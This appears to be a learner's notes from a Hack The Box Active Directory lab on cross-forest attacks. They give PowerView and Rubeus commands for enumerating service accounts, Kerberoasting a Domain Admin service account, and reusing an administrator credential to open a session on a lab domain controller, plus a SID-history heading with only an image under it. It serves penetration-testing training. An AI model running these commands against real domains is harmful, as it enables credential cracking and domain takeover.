## Cross-Forest Kerberoasting
#### Enumerating Accounts for Associated SPNs Using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
#### Enumerating the mssqlsvc Account

```powershell
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
samaccountname memberof 
-------------- -------- 
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```
#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
## Admin Password Re-Use & Group Membership
#### Using Get-DomainForeignGroupMember

```powershell
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
![](Screenshot%202026-06-01%20at%2014.53.01.png)
#### Accessing DC03 Using Enter-PSSession

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
![](Screenshot%202026-06-01%20at%2014.53.32.png)
## SID History Abuse - Cross Forest
![](Pasted%20image%2020260601145514.png)
